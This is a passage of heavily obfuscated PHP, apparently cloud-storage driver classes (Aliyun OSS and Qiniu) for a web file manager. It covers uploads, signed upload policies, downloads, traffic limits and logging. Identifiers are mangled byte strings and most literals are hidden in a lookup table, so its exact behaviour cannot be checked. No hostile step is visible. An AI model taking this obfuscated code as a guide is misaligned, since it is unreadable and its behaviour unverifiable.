$šØ––¹ò)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ªØïç×¾), $ØÜç‰Ê); } catch (OSS\Core\OssException $È«¾×ô) { $this->writeLog(__FUNCTION__ . $Óİß»×Ş[212] . $È«¾×ô->getMessage()); return !1; } return !0; } public function getContent($Ûİ–Óœ) { return $this->fileSubstr($Ûİ–Óœ, -1); } public function setContent($•ÂÇ¤õÊ, $½™§ÑêĞ = '') { $Çœ‚óª« =& $_SERVER[©—Ò»ÅĞ]; try { $¶ƒ¢¤Ö· = $this->trafficLimit($Çœ‚óª«[1694]); $ÂÖ—™ó = $this->client->putObject($this->bucket, $this->pathEncode($•ÂÇ¤õÊ), $½™§ÑêĞ, $¶ƒ¢¤Ö·); } catch (OSS\Core\OssException $‘ĞõÙ©ç) { $this->writeLog(__FUNCTION__ . $Çœ‚óª«[212] . $‘ĞõÙ©ç->getMessage()); return !1; } $°¨Æ¶™ñ = array($Çœ‚óª«[1688] => trim($ÂÖ—™ó[$Çœ‚óª«[1685]], $Çœ‚óª«[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($•ÂÇ¤õÊ))); $this->updateObjMeta($•ÂÇ¤õÊ, $°¨Æ¶™ñ); return isset($ÂÖ—™ó[$Çœ‚óª«[1695]][$Çœ‚óª«[294]]) ? !0 : !1; } private function updateObjMeta($é¹ıá½Û, $›ÔõÍÑ¡) { $é¹ıá½Û = $this->pathEncode($é¹ıá½Û); try { $—îÔ—¿ = array(OSS\OssClient::OSS_HEADERS => $›ÔõÍÑ¡); $this->client->copyObject($this->bucket, $é¹ıá½Û, $this->bucket, $é¹ıá½Û, $—îÔ—¿); } catch (OSS\Core\OssException $È˜ä½Ãü) { $this->writeLog(__FUNCTION__ . $_SERVER[©—Ò»ÅĞ][212] . $È˜ä½Ãü->getMessage()); return !1; } return !0; } public function upload($ï«ƒøŠ, $ŠŠ¶ê¶, $Ÿéáï—ä = false, $™í³îËŞ = REPEAT_REPLACE) { $Û»¨á×• =& $_SERVER[©—Ò»ÅĞ]; if (!$ŠŠ¶ê¶ || !@file_exists($ŠŠ¶ê¶)) { return !1; } $…Šúë = trim($ï«ƒøŠ, $Û»¨á×•[8]); $Ú‡ç–àÇ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Û»¨á×•[1688] => @md5_file($ŠŠ¶ê¶)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ï«ƒøŠ))); $Ú‡ç–àÇ = $this->trafficLimit($Û»¨á×•[1694], $Ú‡ç–àÇ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($…Šúë), $ŠŠ¶ê¶, $Ú‡ç–àÇ); } catch (OSS\Core\OssException $²ÙÉ»òˆ) { $this->writeLog(__FUNCTION__ . $Û»¨á×•[212] . $²ÙÉ»òˆ->getMessage()); return !1; } return $this->getPathOuter($ï«ƒøŠ); } public function getHost() { $€¾†äÔ‹ =& $_SERVER[©—Ò»ÅĞ]; $çŞÉõÓÛ = explode($€¾†äÔ‹[208], parent::getHost()); return $çŞÉõÓÛ[0] . $€¾†äÔ‹[208] . $this->bucket . $€¾†äÔ‹[10] . $çŞÉõÓÛ[1]; } public function uploadFormData($­Áöğî», $Â©ÕÃÄª = 3600) { $“Ï¢§ØÂ =& $_SERVER[©—Ò»ÅĞ]; if (!($Íùœ€íÆ = $this->getHost())) { return !1; } $£­´“ãœ = $Â©ÕÃÄª; $…êº©†ë = date($“Ï¢§ØÂ[1696], time() + $£­´“ãœ); $¼ÎĞïìš = new DateTime($…êº©†ë); $«ÔÉ½ÜÏ = $¼ÎĞïìš->format(DateTime::ISO8601); $‰®üçÛ = strpos($«ÔÉ½ÜÏ, $“Ï¢§ØÂ[371]); $«ÔÉ½ÜÏ = substr($«ÔÉ½ÜÏ, 0, $‰®üçÛ) . $“Ï¢§ØÂ[1697]; $ÔªƒÄ = 1048576000 * 5; $‹¢£Ç˜ = $this->pathFather($­Áöğî»); $ô§¤úğ = array($“Ï¢§ØÂ[262] => $«ÔÉ½ÜÏ, $“Ï¢§ØÂ[265] => array(array($“Ï¢§ØÂ[1698], 0, $ÔªƒÄ), array($“Ï¢§ØÂ[267], $“Ï¢§ØÂ[268], $‹¢£Ç˜))); $Ë¥˜§³¨ = base64_encode(json_encode($ô§¤úğ)); $ª÷ïÌ = base64_encode(hash_hmac($“Ï¢§ØÂ[1524], $Ë¥˜§³¨, $this->secret, !0)); $òÓš™¿ = array($“Ï¢§ØÂ[1699] => $this->accessKey, $“Ï¢§ØÂ[277] => $Ë¥˜§³¨, $“Ï¢§ØÂ[270] => $“Ï¢§ØÂ[261], $“Ï¢§ØÂ[1700] => $ª÷ïÌ, $“Ï¢§ØÂ[206] => $Íùœ€íÆ); $òÓš™¿ = $this->trafficLimit($“Ï¢§ØÂ[1694], $òÓš™¿, !0); return $òÓš™¿; } public function uploadMultiData($ó¡®ŒÚ¿, $ò½”ïŒ = 3600) { $÷ï´Ÿïñ =& $_SERVER[©—Ò»ÅĞ]; if (!($Ôø¬ÕÁÒ = $this->getHost())) { return !1; } $À‹Í¦Ù¦ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ó¡®ŒÚ¿)); return array($÷ï´Ÿïñ[281] => $À‹Í¦Ù¦, $÷ï´Ÿïñ[206] => $Ôø¬ÕÁÒ . $÷ï´Ÿïñ[8] . $this->pathEncode($ó¡®ŒÚ¿), $÷ï´Ÿïñ[282] => gmdate($÷ï´Ÿïñ[1701]), $÷ï´Ÿïñ[95] => $ó¡®ŒÚ¿); } public function uploadMultiAuth($¿ƒÓ©Ÿ‚, $¦±ãê´“ = array()) { if (isset($¦±ãê´“[$_SERVER[©—Ò»ÅĞ][283]])) { return $this->uploadPartAuth($¿ƒÓ©Ÿ‚, $¦±ãê´“); } return $this->uploadListAuth($¿ƒÓ©Ÿ‚, $¦±ãê´“); } private function uploadPartAuth($ú¯¹Œ¦, $úËòà¤© = array()) { $‘¥ˆû®… =& $_SERVER[©—Ò»ÅĞ]; $Ë‹‡óş = $úËòà¤©[$‘¥ˆû®…[95]]; $òëêşÃö = $this->_getUploadAuth($Ë‹‡óş, $úËòà¤©); $µŠĞàæ = array($‘¥ˆû®…[286] => $òëêşÃö[$‘¥ˆû®…[286]], $‘¥ˆû®…[282] => $òëêşÃö[$‘¥ˆû®…[282]]); if (isset($òëêşÃö[$‘¥ˆû®…[1702]])) { $µŠĞàæ[$‘¥ˆû®…[1702]] = $òëêşÃö[$‘¥ˆû®…[1702]]; } return $µŠĞàæ; } private function uploadListAuth($Çµ€ŠÁ¢, $Ò€€©—Å = array()) { $É³…ô… =& $_SERVER[©—Ò»ÅĞ]; $””ò›Õ = $Ò€€©—Å[$É³…ô…[95]]; $ê§âĞÎ = $Ò€€©—Å[$É³…ô…[281]]; $¦Ñ…³¬´ = $this->client->listParts($this->bucket, $this->pathEncode($””ò›Õ), $ê§âĞÎ); $ŸïÓ ˆœ = $¦Ñ…³¬´->getListPart(); $¥ÜúŠÌè = array(); foreach ($ŸïÓ ˆœ as $ŞŠÅ—ƒÒ) { $¥ÜúŠÌè[] = array($É³…ô…[297] => $ŞŠÅ—ƒÒ->getPartNumber(), $É³…ô…[298] => trim($ŞŠÅ—ƒÒ->getETag(), $É³…ô…[118])); } if (!$¥ÜúŠÌè) { return !1; } $¬ ãñ² = $this->_getUploadAuth($””ò›Õ, $Ò€€©—Å); return array($É³…ô…[286] => $¬ ãñ²[$É³…ô…[286]], $É³…ô…[282] => $¬ ãñ²[$É³…ô…[282]], $É³…ô…[289] => $¥ÜúŠÌè); } private function _getUploadAuth($şéå›æ , $á¹–Ã°Ø) { $ğš†¡ö¬ =& $_SERVER[©—Ò»ÅĞ]; $Ì»ƒŒğÇ = gmdate($ğš†¡ö¬[1701]); $ãµÚƒÊ¤ = isset($á¹–Ã°Ø[$ğš†¡ö¬[283]]) ? $ğš†¡ö¬[253] : $ğš†¡ö¬[288]; $†‡½øÁá = array_intersect_key($á¹–Ã°Ø, array_flip(array($ğš†¡ö¬[283], $ğš†¡ö¬[281]))); ksort($†‡½øÁá); $’Ã¤äµ¬ = $†‡½øÁá ? $ğš†¡ö¬[76] . http_build_query($†‡½øÁá, null, $ğš†¡ö¬[284], PHP_QUERY_RFC3986) : $ğš†¡ö¬[12]; $Ä½éæê = array($ãµÚƒÊ¤, $ğš†¡ö¬[12], $ğš†¡ö¬[120], $Ì»ƒŒğÇ, "\x78\x2d\x6f\x73\x73\x2d\144\141\164\x65\x3a{$Ì»ƒŒğÇ}", $ğš†¡ö¬[8] . $this->bucket . $ğš†¡ö¬[8] . $şéå›æ  . $’Ã¤äµ¬); if (isset($á¹–Ã°Ø[$ğš†¡ö¬[283]])) { $‡ºúçÇ° = $this->trafficLimit($ğš†¡ö¬[1694], array(), !0); if ($‡ºúçÇ°) { $şéå›æ  = $ğš†¡ö¬[1702]; array_splice($Ä½éæê, 5, 0, $şéå›æ  . $ğš†¡ö¬[4] . $‡ºúçÇ°[$şéå›æ ]); } } $üÔŞÖ´ = implode($ğš†¡ö¬[285], $Ä½éæê); $ «Õæ = base64_encode(hash_hmac($ğš†¡ö¬[1524], $üÔŞÖ´, $this->secret, !0)); $Ü£üì’ş = $ğš†¡ö¬[1671] . $this->accessKey . $ğš†¡ö¬[4] . $ «Õæ; $—Ïè“ = array($ğš†¡ö¬[286] => $Ü£üì’ş, $ğš†¡ö¬[282] => $Ì»ƒŒğÇ); if (!empty($‡ºúçÇ°)) { $—Ïè“ = array_merge($—Ïè“, $‡ºúçÇ°); } return $—Ïè“; } public function download($ôëôˆ•, $ÂÀ¶ÎÆê) { $¢ÓäŸ– =& $_SERVER[©—Ò»ÅĞ]; if ($this->isFolder($ôëôˆ•)) { return !1; } try { $ıˆõå½ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ÂÀ¶ÎÆê); $ıˆõå½ = $this->trafficLimit($¢ÓäŸ–[109], $ıˆõå½); $this->client->getObject($this->bucket, $this->pathEncode($ôëôˆ•), $ıˆõå½); } catch (OSS\Core\OssException $ëÖ÷šøİ) { $this->writeLog(__FUNCTION__ . $¢ÓäŸ–[212] . $ëÖ÷šøİ->getMessage()); return !1; } return $ÂÀ¶ÎÆê; } public function fileSubstr($·¥Ìœğå, $×ˆÖØòê = 0, $ú€´ íÊ = false) { if ($×ˆÖØòê === -1) { $¤æ—êŸŸ = array(); } else { if ($ú€´ íÊ === !1) { $Ò¹¾¹¬³ = $this->size($·¥Ìœğå); } else { $Ò¹¾¹¬³ = $×ˆÖØòê + $ú€´ íÊ - 1; } $¤æ—êŸŸ = array(OSS\OssClient::OSS_RANGE => "{$×ˆÖØòê}\55{$Ò¹¾¹¬³}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($·¥Ìœğå), $¤æ—êŸŸ); } catch (OSS\Core\OssException $ÂùªÚù÷) { $this->writeLog(__FUNCTION__ . $_SERVER[©—Ò»ÅĞ][212] . $ÂùªÚù÷->getMessage()); think_exception($ÂùªÚù÷->getMessage()); return !1; } } private function trafficLimit($ˆú¥¿è¹, $Ÿ„ªÂ²ø = array(), $¢ÎŞ¡öı = false) { $¶şÑûÚ§ =& $_SERVER[©—Ò»ÅĞ]; if ($ˆú¥¿è¹ == $¶şÑûÚ§[1694] && $this->isUploadServer() || $ˆú¥¿è¹ == $¶şÑûÚ§[109] && $this->isFileOutServer()) { return $Ÿ„ªÂ²ø; } $êí³èìš = floatval($GLOBALS[$¶şÑûÚ§[6]][$¶şÑûÚ§[92]][$¶şÑûÚ§[107]][$ˆú¥¿è¹]) * 1024 * 1024 * 8; if (!$êí³èìš) { return $Ÿ„ªÂ²ø; } $êí³èìš = $êí³èìš < 819200 ? 819200 : ($êí³èìš > 838860800 ? 838860800 : $êí³èìš); if ($¢ÎŞ¡öı) { $Ÿ„ªÂ²ø[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($êí³èìš); } else { if (!isset($Ÿ„ªÂ²ø[OSS\OssClient::OSS_HEADERS])) { $Ÿ„ªÂ²ø[OSS\OssClient::OSS_HEADERS] = array(); } $Ÿ„ªÂ²ø[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($êí³èìš); } return $Ÿ„ªÂ²ø; } public function link($¥ŞŸÍê¶, $•ëÍäã = array()) { $½„¦ÌËë =& $_SERVER[©—Ò»ÅĞ]; if (!$this->exist($¥ŞŸÍê¶) || $this->isFolder($¥ŞŸÍê¶)) { return !1; } try { $•ëÍäã = $this->trafficLimit($½„¦ÌËë[109], $•ëÍäã, !0); $Úøäøò© = $this->client->signUrl($this->bucket, $this->pathEncode($¥ŞŸÍê¶), 3600 * 12, $½„¦ÌËë[1605], $•ëÍäã); return $this->getCdnLink($Úøäøò©); } catch (OSS\Core\OssException $œÛÄ»Ïñ) { $this->writeLog(__FUNCTION__ . $½„¦ÌËë[212] . $œÛÄ»Ïñ->getMessage()); return !1; } } public function fileOut($§¸˜Ö­, $¥ğ¶…íÂ = false, $¸Ş‰­†ò = false, $üé‹Ôš£ = '') { $ç¦‡Õ½ =& $_SERVER[©—Ò»ÅĞ]; if ($this->isFileOutServer()) { return $this->fileOutServer($§¸˜Ö­, $¥ğ¶…íÂ, $¸Ş‰­†ò, $üé‹Ôš£); } if (!$¸Ş‰­†ò) { $¸Ş‰­†ò = $this->pathThis($§¸˜Ö­); } $¸Ş‰­†ò = rawurlencode($¸Ş‰­†ò); $„Ìş©÷æ = get_file_mime(get_path_ext($¸Ş‰­†ò)); if ($„Ìş©÷æ == $ç¦‡Õ½[248]) { return parent::fileOut($§¸˜Ö­, $¥ğ¶…íÂ, $¸Ş‰­†ò, $üé‹Ôš£); } $¥ğ¶…íÂ = $¥ğ¶…íÂ ? $ç¦‡Õ½[1703] : $ç¦‡Õ½[1704]; $×É¬‹ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ç¦‡Õ½[1705] . rawurlencode("{$¥ğ¶…íÂ}\x3b\x66\x69\x6c\x65\x6e\x61\x6d\x65\75{$¸Ş‰­†ò}")); $÷ù©­œƒ = $this->link($§¸˜Ö­, $×É¬‹); $this->fileOutLink($÷ù©­œƒ); } public function fileOutServer($“‹‚¢¦×, $˜Š·Ñå = false, $„ıì˜ïˆ = false, $øäâÕÊó = '') { parent::fileOut($“‹‚¢¦×, $˜Š·Ñå, $„ıì˜ïˆ, $øäâÕÊó); } public function fileOutImage($Ú±¹ßÊğ, $â„ÑÜ«ä = 250) { if ($this->size($Ú±¹ßÊğ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Ú±¹ßÊğ, $â„ÑÜ«ä); } $–°ÒÑÁ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[©—Ò»ÅĞ][1668] . $â„ÑÜ«ä); $¬˜ï”“æ = $this->link($Ú±¹ßÊğ, $–°ÒÑÁ); $this->fileOutLink($¬˜ï”“æ); } public function fileOutImageServer($ÍİÂ¢É, $ıÜë·¹ = 250) { parent::fileOutImage($ÍİÂ¢É, $ıÜë·¹); } public function fileOutLink($„é‹û¹ƒ) { $˜œÓÈ¦Î =& $_SERVER[©—Ò»ÅĞ]; if (!$this->isCdnHost() && substr($„é‹û¹ƒ, 0, 7) == $˜œÓÈ¦Î[216]) { $„é‹û¹ƒ = $˜œÓÈ¦Î[217] . substr($„é‹û¹ƒ, 7); } header($˜œÓÈ¦Î[172] . $„é‹û¹ƒ); die; } public function hashMd5($šÊ’¢²Æ, $áéíªûè = '') { $Ğ™Ä½±‹ =& $_SERVER[©—Ò»ÅĞ]; $…š§é¥€ = $this->_objectMeta($šÊ’¢²Æ); if (!$…š§é¥€) { return $Ğ™Ä½±‹[12]; } if (!isset($…š§é¥€[$Ğ™Ä½±‹[1688]]) && !empty($áéíªûè)) { $œŞ‰ø£æ = $this->updateObjMeta($šÊ’¢²Æ, array($Ğ™Ä½±‹[1688] => $áéíªûè)); $…š§é¥€[$Ğ™Ä½±‹[1688]] = $œŞ‰ø£æ ? $áéíªûè : $Ğ™Ä½±‹[12]; } return isset($…š§é¥€[$Ğ™Ä½±‹[1688]]) ? strtolower($…š§é¥€[$Ğ™Ä½±‹[1688]]) : $Ğ™Ä½±‹[12]; } public function size($¸À‰ŞóÎ) { $ÑÔ„“Ÿ¯ = $this->objectMeta($¸À‰ŞóÎ); return $ÑÔ„“Ÿ¯ ? $ÑÔ„“Ÿ¯[$_SERVER[©—Ò»ÅĞ][79]] : 0; } public function info($Äõ«ü) { if ($this->isFolder($Äõ«ü)) { return $this->folderInfo($Äõ«ü); } else { if ($this->isFile($Äõ«ü)) { return $this->fileInfo($Äõ«ü); } } return !1; } public function exist($•ŞÆ±â) { return $this->isFile($•ŞÆ±â) || $this->isFolder($•ŞÆ±â); } public function isFile($ûÃÃ¯) { return !$this->isFolder($ûÃÃ¯) && $this->objectMeta($ûÃÃ¯); } public function isFolder($»®ï¬†) { return $this->cacheMethod($_SERVER[©—Ò»ÅĞ][177], $»®ï¬†); } protected function objectMeta($Éçàªº) { return $this->cacheMethod($_SERVER[©—Ò»ÅĞ][179], $Éçàªº); } protected function _objectMeta($«Ì•ÙÅ) { $ÁØÖÜ‰ù =& $_SERVER[©—Ò»ÅĞ]; try { $à¹¶ü²˜ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($«Ì•ÙÅ)); } catch (OSS\Core\OssException $äÁÈºÆ) { $this->writeLog(__FUNCTION__ . $ÁØÖÜ‰ù[212] . $äÁÈºÆ->getMessage()); $à¹¶ü²˜ = !1; } if ($à¹¶ü²˜) { $à¹¶ü²˜[$ÁØÖÜ‰ù[79]] = intval($à¹¶ü²˜[$ÁØÖÜ‰ù[1686]]); } return $à¹¶ü²˜; } protected function _isFolder($ğ¸«†ÁÖ) { $ğ²ÃŒğ =& $_SERVER[©—Ò»ÅĞ]; if ($ğ¸«†ÁÖ == $ğ²ÃŒğ[12] || $ğ¸«†ÁÖ == $ğ²ÃŒğ[8]) { return !0; } $ÚÙñ×öá = array($ğ²ÃŒğ[1681] => $ğ²ÃŒğ[8], $ğ²ÃŒğ[1682] => rtrim($ğ¸«†ÁÖ, $ğ²ÃŒğ[8]) . $ğ²ÃŒğ[8], $ğ²ÃŒğ[1683] => 1, $ğ²ÃŒğ[1684] => $ğ²ÃŒğ[12]); $¯—Âã¢‘ = $this->client->listObjects($this->bucket, $ÚÙñ×öá); if ($¯—Âã¢‘->getObjectList() || $¯—Âã¢‘->getPrefixList()) { return !0; } return !1; } public function writeLog($û‘ìÜƒ§ = '', $÷™¶Õ“· = false) { $ó§ŠìÅÓ =& $_SERVER[©—Ò»ÅĞ]; $Ê¤¹ = in_array(ACTION, array($ó§ŠìÅÓ[210], $ó§ŠìÅÓ[211])); if (!$Ê¤¹ && !GLOBAL_DEBUG) { return; } $Ãö½š¤ë = 0; if (stripos($û‘ìÜƒ§, $ó§ŠìÅÓ[1706]) !== !1) { $Ãö½š¤ë = 1; $ñı‘ñŸÇ = explode($ó§ŠìÅÓ[1707], $û‘ìÜƒ§); $û‘ìÜƒ§ = !empty($ñı‘ñŸÇ[1]) ? $ñı‘ñŸÇ[1] : $û‘ìÜƒ§; } else { if (stripos($û‘ìÜƒ§, $ó§ŠìÅÓ[1708])) { $Ãö½š¤ë = 2; $ñı‘ñŸÇ = explode($ó§ŠìÅÓ[1708], $û‘ìÜƒ§); $ñı‘ñŸÇ = explode($ó§ŠìÅÓ[4], $ñı‘ñŸÇ[0]); $û‘ìÜƒ§ = !empty($ñı‘ñŸÇ[1]) ? $ñı‘ñŸÇ[1] : $û‘ìÜƒ§; } } if ($Ê¤¹ && I18n::getType() == $ó§ŠìÅÓ[1709]) { if ($Ãö½š¤ë == 1) { $û‘ìÜƒ§ = str_replace($ó§ŠìÅÓ[1710], $ó§ŠìÅÓ[1711], $û‘ìÜƒ§); } else { if ($Ãö½š¤ë == 2) { $ñı‘ñŸÇ = explode($ó§ŠìÅÓ[212], $ñı‘ñŸÇ[0]); $åÒì×° = isset($ñı‘ñŸÇ[1]) ? $ñı‘ñŸÇ[1] : $ó§ŠìÅÓ[12]; $«ôñ´Â = array($ó§ŠìÅÓ[1712] => $ó§ŠìÅÓ[1713], $ó§ŠìÅÓ[1714] => $ó§ŠìÅÓ[1715], $ó§ŠìÅÓ[1716] => $ó§ŠìÅÓ[1717], $ó§ŠìÅÓ[1718] => $ó§ŠìÅÓ[1719], $ó§ŠìÅÓ[1720] => $ó§ŠìÅÓ[1721], $ó§ŠìÅÓ[1722] => $ó§ŠìÅÓ[1723], $ó§ŠìÅÓ[1724] => $ó§ŠìÅÓ[1725], $ó§ŠìÅÓ[1726] => $ó§ŠìÅÓ[1727], $ó§ŠìÅÓ[1728] => $ó§ŠìÅÓ[1729], $ó§ŠìÅÓ[1730] => $ó§ŠìÅÓ[1731]); if (isset($«ôñ´Â[$åÒì×°])) { $û‘ìÜƒ§ = $«ôñ´Â[$åÒì×°]; } } } if (stripos($û‘ìÜƒ§, $ó§ŠìÅÓ[1732])) { $û‘ìÜƒ§ = $ó§ŠìÅÓ[1733]; } } if (!trim($û‘ìÜƒ§)) { return; } parent::writeLog(trim($û‘ìÜƒ§), $÷™¶Õ“·); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($£²Èñú) { parent::__construct(); require_once SDK_DIR . $_SERVER[©—Ò»ÅĞ][1734]; $this->_init($£²Èñú); } public function _init($¶Óú†­ ) { $ìÒ Ë‹˜ =& $_SERVER[©—Ò»ÅĞ]; $this->config = $¶Óú†­ ; foreach ($¶Óú†­  as $®ó»…ˆÃ => $ÕÖ…•Ì) { if (isset($this->{$®ó»…ˆÃ})) { $this->{$®ó»…ˆÃ} = $ÕÖ…•Ì; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ìÒ Ë‹˜[1735] . LNG($ìÒ Ë‹˜[1672])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ÁÒá½·¡, $Ø¼íÔÅË = '', $…Âó¶±Ó = REPEAT_RENAME) { if ($this->setContent($ÁÒá½·¡, $Ø¼íÔÅË)) { return $this->getPathOuter($ÁÒá½·¡); } return !1; } public function mkdir($˜üôÃÊ», $ï ãÄÈ = REPEAT_SKIP) { $º©¨ÈÉ =& $_SERVER[©—Ò»ÅĞ]; $¬§«ÔüŸ = trim($˜üôÃÊ», $º©¨ÈÉ[8]); if ($this->_isFolder($¬§«ÔüŸ)) { return $this->getPathOuter($¬§«ÔüŸ); } $˜üôÃÊ» = $¬§«ÔüŸ . $º©¨ÈÉ[8]; $ô•ßà·â = get_path_this($¬§«ÔüŸ); $ˆÜÇè€ = $˜üôÃÊ» . $ô•ßà·â; if (!$this->mkfile($ˆÜÇè€)) { return !1; } if (!$this->moveFile($ˆÜÇè€, $˜üôÃÊ»)) { $this->delFile($ˆÜÇè€); return !1; } return $this->getPathOuter($¬§«ÔüŸ); } public function copyFile($ñ œúÄ…, $¼³şÚ¿‰) { $±£ŞƒµÇ = $this->bucketManager->copy($this->bucket, $ñ œúÄ…, $this->bucket, $¼³şÚ¿‰, !0); return $±£ŞƒµÇ ? !1 : $this->getPathOuter($¼³şÚ¿‰); } public function moveFile($ÛÜ©×Óˆ, $Ñƒ•©È) { $ä©™¸á = $this->bucketManager->move($this->bucket, $ÛÜ©×Óˆ, $this->bucket, $Ñƒ•©È, !0); return $ä©™¸á ? !1 : $this->getPathOuter($Ñƒ•©È); } public function delFile($¨Œ†×ÇÂ) { if (!$this->exist($¨Œ†×ÇÂ)) { return !0; } $İØé”ü… = $this->bucketManager->delete($this->bucket, $¨Œ†×ÇÂ); if (!$İØé”ü…) { return !0; } return $İØé”ü…->code() == 612 ? !0 : !1; } public function delFolder($òßœ…–Œ) { $ó¯ÕÊĞ£ =& $_SERVER[©—Ò»ÅĞ]; if (!$this->exist($òßœ…–Œ)) { return !0; } $this->listItemCache = !1; $öúş’¼Õ = $this->fileList($òßœ…–Œ); $this->listItemCache = !0; $öºØÉÒü = trim($òßœ…–Œ, $ó¯ÕÊĞ£[8]) . $ó¯ÕÊĞ£[8]; if (!empty($òßœ…–Œ) && $òßœ…–Œ !== $ó¯ÕÊĞ£[228] && !in_array($öºØÉÒü, $öúş’¼Õ[$ó¯ÕÊĞ£[85]])) { $öúş’¼Õ[$ó¯ÕÊĞ£[85]][] = $öºØÉÒü; } $úğª²ı´ = $this->delByBatch($öúş’¼Õ[$ó¯ÕÊĞ£[86]]); if (!$úğª²ı´) { return !1; } $úğª²ı´ = $this->delByBatch($öúş’¼Õ[$ó¯ÕÊĞ£[85]]); if (!$úğª²ı´) { return !1; } return $this->delFile($öºØÉÒü); } private function delByBatch($è¬•ù™ß) { foreach (array_chunk($è¬•ù™ß, 1000) as $¸ê…›‡¦) { $Æ‹ùìâ = $this->bucketManager->buildBatchDelete($this->bucket, $¸ê…›‡¦); list($—¯Ù‡Øë, $Ï£ì¦³İ) = $this->bucketManager->batch($Æ‹ùìâ); if ($Ï£ì¦³İ) { return !1; } } return !0; } public function rename($åÊšº›÷, $‹ì÷Ëî–) { return $this->renameObject($åÊšº›÷, $‹ì÷Ëî–); } public function fileInfo($ıöÎö†û, $¸İ–ïì¿ = false, $™òÖš¥£ = array()) { $Üô‰×½ =& $_SERVER[©—Ò»ÅĞ]; $¤ï¬¾î = array($Üô‰×½[32] => $this->pathThis($ıöÎö†û), $Üô‰×½[87] => $this->getPathOuter($Üô‰×½[8] . $ıöÎö†û), $Üô‰×½[33] => $Üô‰×½[230], $Üô‰×½[79] => isset($™òÖš¥£[$Üô‰×½[1736]]) ? $™òÖš¥£[$Üô‰×½[1736]] : 0, $Üô‰×½[166] => $this->ext($ıöÎö†û)); if ($¸İ–ïì¿) { return $¤ï¬¾î; } $¤ï¬¾î[$Üô‰×½[231]] = $¤ï¬¾î[$Üô‰×½[88]] = 0; $¤ï¬¾î[$Üô‰×½[232]] = $¤ï¬¾î[$Üô‰×½[233]] = !0; if (empty($™òÖš¥£)) { $™òÖš¥£ = $this->objectMeta($ıöÎö†û); if (!$™òÖš¥£) { return $¤ï¬¾î; } } if (isset($™òÖš¥£[$Üô‰×½[234]]) && $™òÖš¥£[$Üô‰×½[234]]) { $¤ï¬¾î[$Üô‰×½[235]] = $™òÖš¥£[$Üô‰×½[234]]; } if (isset($™òÖš¥£[$Üô‰×½[245]]) && $™òÖš¥£[$Üô‰×½[245]]) { $¤ï¬¾î[$Üô‰×½[235]] = $™òÖš¥£[$Üô‰×½[245]]; } if (isset($™òÖš¥£[$Üô‰×½[1737]])) { $¤ï¬¾î[$Üô‰×½[88]] = substr($™òÖš¥£[$Üô‰×½[1737]] . $Üô‰×½[12], 0, 10); } if (isset($™òÖš¥£[$Üô‰×½[1736]])) { $¤ï¬¾î[$Üô‰×½[79]] = $™òÖš¥£[$Üô‰×½[1736]]; } return $¤ï¬¾î; } public function folderInfo($Æ‘×«Ìö, $Ã•Èòò› = false) { $¡ãıÜä» =& $_SERVER[©—Ò»ÅĞ]; $á·ƒö = array($¡ãıÜä»[32] => $this->pathThis($Æ‘×«Ìö), $¡ãıÜä»[87] => $this->getPathOuter($¡ãıÜä»[8] . $Æ‘×«Ìö), $¡ãıÜä»[33] => $¡ãıÜä»[78]); if ($Ã•Èòò›) { return $á·ƒö; } $á·ƒö[$¡ãıÜä»[231]] = $á·ƒö[$¡ãıÜä»[88]] = 0; $á·ƒö[$¡ãıÜä»[232]] = $á·ƒö[$¡ãıÜä»[233]] = !0; $Æ‘×«Ìö = rtrim($Æ‘×«Ìö, $¡ãıÜä»[8]) . $¡ãıÜä»[8]; $ùºú—‹¾ = $this->objectMeta($Æ‘×«Ìö); if (isset($ùºú—‹¾[$¡ãıÜä»[1737]])) { $á·ƒö[$¡ãıÜä»[88]] = substr($ùºú—‹¾[$¡ãıÜä»[1737]] . $¡ãıÜä»[12], 0, 10); } return $á·ƒö; } public function listPath($Û™¥ôªª, $½¸‚ï€ø = false) { $ƒ€°»â =& $_SERVER[©—Ò»ÅĞ]; $ ÛÁîÈâ = $this->fileList($Û™¥ôªª, $ƒ€°»â[8], !0); foreach ($ ÛÁîÈâ[$ƒ€°»â[85]] as $Š·Æ => $Êâ×Š÷Ö) { $ ÛÁîÈâ[$ƒ€°»â[85]][$Š·Æ] = $this->folderInfo($Êâ×Š÷Ö, $½¸‚ï€ø); } foreach ($ ÛÁîÈâ[$ƒ€°»â[86]] as $Š·Æ => $Êâ×Š÷Ö) { $ ÛÁîÈâ[$ƒ€°»â[86]][$Š·Æ] = $this->fileInfo($Êâ×Š÷Ö[$ƒ€°»â[32]], $½¸‚ï€ø, $Êâ×Š÷Ö); } return $ ÛÁîÈâ; } public function has($’Ñ¸Ì , $¼Õ¾²ªã = false, $€œŒ§¾ = true) { $‘¦ô’„ş =& $_SERVER[©—Ò»ÅĞ]; $’Ñ¸Ì  = trim($’Ñ¸Ì , $‘¦ô’„ş[8]); $¹››£§‡ = empty($’Ñ¸Ì ) && $’Ñ¸Ì  !== $‘¦ô’„ş[228] ? $‘¦ô’„ş[12] : $’Ñ¸Ì  . $‘¦ô’„ş[8]; 